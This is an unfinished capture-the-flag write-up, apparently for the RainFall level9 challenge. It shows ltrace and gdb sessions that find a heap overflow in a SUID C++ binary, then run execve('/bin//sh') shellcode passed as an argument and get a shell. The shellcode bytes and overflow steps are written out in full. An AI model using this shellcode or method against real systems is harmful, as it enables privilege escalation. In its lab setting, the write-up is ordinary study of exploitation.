Login as `level9`.
```shell
┌──$ [~/42/2021/rainfall]
└─>  ssh 192.168.0.30 -p 4242 -l level9
level8@192.168.0.30's password: c542e581c5ba5162a85f767996e3247ed619ef6c6f7b76a59435545dc6259f8a
```
A `SUID` executable is located in the home directory.
```shell
level9@RainFall:~$ ls -l
total 8
-rwsr-s---+ 1 bonus0 users 6720 Mar  6  2016 level9
```

```shell
level9@RainFall:~$
level9@RainFall:~$
level9@RainFall:~$
level9@RainFall:~$ ltrace ./level9 `python -c "print 'a'*108"`
__libc_start_main(0x80485f4, 2, 0xbffff774, 0x8048770, 0x80487e0 <unfinished ...>
_ZNSt8ios_base4InitC1Ev(0x8049bb4, 0xb7d79dc6, 0xb7eebff4, 0xb7d79e55, 0xb7f4a330) = 0xb7fce990
__cxa_atexit(0x8048500, 0x8049bb4, 0x8049b78, 0xb7d79e55, 0xb7f4a330) = 0
_Znwj(108, 0xbffff774, 0xbffff780, 0xb7d79e55, 0xb7fed280) = 0x804a008
_Znwj(108, 5, 0xbffff780, 0xb7d79e55, 0xb7fed280) = 0x804a078
strlen("aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"...)     = 108
memcpy(0x0804a00c, "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"..., 108) = 0x0804a00c
_ZNSt8ios_base4InitD1Ev(0x8049bb4, 0x61616167, 0x804a078, 0x8048738, 0x804a00c) = 0xb7fce4a0
+++ exited (status 103) +++
level9@RainFall:~$
level9@RainFall:~$
level9@RainFall:~$
level9@RainFall:~$
level9@RainFall:~$ ltrace ./level9 `python -c "print 'a'*109"`
__libc_start_main(0x80485f4, 2, 0xbffff774, 0x8048770, 0x80487e0 <unfinished ...>
_ZNSt8ios_base4InitC1Ev(0x8049bb4, 0xb7d79dc6, 0xb7eebff4, 0xb7d79e55, 0xb7f4a330) = 0xb7fce990
__cxa_atexit(0x8048500, 0x8049bb4, 0x8049b78, 0xb7d79e55, 0xb7f4a330) = 0
_Znwj(108, 0xbffff774, 0xbffff780, 0xb7d79e55, 0xb7fed280) = 0x804a008
_Znwj(108, 5, 0xbffff780, 0xb7d79e55, 0xb7fed280) = 0x804a078
strlen("aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"...)     = 109
memcpy(0x0804a00c, "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"..., 109) = 0x0804a00c
--- SIGSEGV (Segmentation fault) ---
+++ killed by SIGSEGV +++
```






(gdb) info frame
Stack level 0, frame at 0xbffff6d0:
 eip = 0x80485fe in main; saved eip 0xb7d604d3
 Arglist at 0xbffff6c8, args:
 Locals at 0xbffff6c8, Previous frame's sp is 0xbffff6d0
 Saved registers:
  ebp at 0xbffff6c8, eip at 0xbffff6cc
(gdb) x/wx $ebp+0x8         # argc - Number of argumets
0xbffff6d0:	0x00000002
(gdb) x/wx $ebp+0xc         # argv - Address of list of argumets
0xbffff6d4:	0xbffff764
(gdb) x 0xbffff764
0xbffff764:	0xbffff883
(gdb) x/32s 0xbffff883
0xbffff883:	 "/home/user/level9/level9"
0xbffff89c:	 "1\300Ph//shh/bin\211\343\211\301\211°\v̀1\300@̀", 'A' <repeats 81 times>
0xbffff90a:	 "SHELL=/bin/bash"
0xbffff91a:	 "TERM=xterm-256color"
0xbffff92e:	 "SSH_CLIENT=192.168.0.12 59331 4242"
0xbffff951:	 "SSH_TTY=/dev/pts/0"
0xbffff964:	 "USER=level9"
0xbffff970:	 "LS_COLORS=rs=0:di=01;34:ln=01;36:mh=00:pi=40;33:so=01;35:do=01;35:bd=40;33;01:cd=40;33;01:or=40;31;01:su=37;41:sg=30;43:ca=30;41:tw=30;42:ow=34;42:st=37;44:ex=01;32:*.tar=01;31:*.tgz=01;31:*.arj=01;31"...
0xbffffa38:	 ":*.taz=01;31:*.lzh=01;31:*.lzma=01;31:*.tlz=01;31:*.txz=01;31:*.zip=01;31:*.z=01;31:*.Z=01;31:*.dz=01;31:*.gz=01;31:*.lz=01;31:*.xz=01;31:*.bz2=01;31:*.bz=01;31:*.tbz=01;31:*.tbz2=01;31:*.tz=01;31:*.d"...
0xbffffb00:	 "eb=01;31:*.rpm=01;31:*.jar=01;31:*.war=01;31:*.ear=01;31:*.sar=01;31:*.rar=01;31:*.ace=01;31:*.zoo=01;31:*.cpio=01;31:*.7z=01;31:*.rz=01;31:*.jpg=01;35:*.jpeg=01;35:*.gif=01;35:*.bmp=01;35:*.pbm=01;35"...
0xbffffbc8:	 ":*.pgm=01;35:*.ppm=01;35:*.tga=01;35:*.xbm=01;35:*.xpm=01;35:*.tif=01;35:*.tiff=01;35:*.png=01;35:*.svg=01;35:*.svgz=01;35:*.mng=01;35:*.pcx=01;35:*.mov=01;35:*.mpg=01;35:*.mpeg=01;35:*.m2v=01;35:*.mk"...
0xbffffc90:	 "v=01;35:*.webm=01;35:*.ogm=01;35:*.mp4=01;35:*.m4v=01;35:*.mp4v=01;35:*.vob=01;35:*.qt=01;35:*.nuv=01;35:*.wmv=01;35:*.asf=01;35:*.rm=01;35:*.rmvb=01;35:*.flc=01;35:*.avi=01;35:*.fli=01;35:*.flv=01;35"...
0xbffffd58:	 ":*.gl=01;35:*.dl=01;35:*.xcf=01;35:*.xwd=01;35:*.yuv=01;35:*.cgm=01;35:*.emf=01;35:*.axv=01;35:*.anx=01;35:*.ogv=01;35:*.ogx=01;35:*.aac=00;36:*.au=00;36:*.flac=00;36:*.mid=00;36:*.midi=00;36:*.mka=00"...
0xbffffe20:	 ";36:*.mp3=00;36:*.mpc=00;36:*.ogg=00;36:*.ra=00;36:*.wav=00;36:*.axa=00;36:*.oga=00;36:*.spx=00;36:*.xspf=00;36:"
0xbffffe91:	 "COLUMNS=238"
0xbffffe9d:	 "PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games"
0xbffffeea:	 "MAIL=/var/mail/level9"
0xbfffff00:	 "_=/usr/bin/gdb"
0xbfffff0f:	 "PWD=/home/user/level9"
0xbfffff25:	 "LANG=en_US.UTF-8"
0xbfffff36:	 "LINES=69"
0xbfffff3f:	 "HOME=/home/user/level9"
0xbfffff56:	 "SHLVL=1"
0xbfffff5e:	 "LOGNAME=level9"
0xbfffff6d:	 "SSH_CONNECTION=192.168.0.12 59331 192.168.0.33 4242"
0xbfffffa1:	 "LESSOPEN=| /usr/bin/lesspipe %s"
0xbfffffc1:	 "LESSCLOSE=/usr/bin/lesspipe %s %s"
0xbfffffe3:	 "/home/user/level9/level9"
0xbffffffc:	 ""
0xbffffffd:	 ""
0xbffffffe:	 ""
0xbfffffff:	 ""










(gdb) break *0x08048693
Breakpoint 1 at 0x8048693
(gdb) run $(python -c "print '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80' + 'A'*81")
Starting program: /home/user/level9/level9 $(python -c "print '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80' + 'A'*81")

Breakpoint 1, 0x08048693 in main ()
(gdb) i r $edx
edx            0x54000000	1409286144
(gdb) set $edx=0x804a00c
(gdb) i r $edx
edx            0x804a00c	134520844
(gdb) continue
Continuing.
process 12435 is executing new program: /bin/dash
$ id
uid=2009(level9) gid=2009(level9) groups=2009(level9),100(users)




0x8048854	_ZTI1N
0x804873a	_ZN1NplERS_
0x804874e	_ZN1NmiERS_
0x8049b88	_ZTVN10__cxxabiv117__class_type_infoE
0x8048850	_ZTS1N
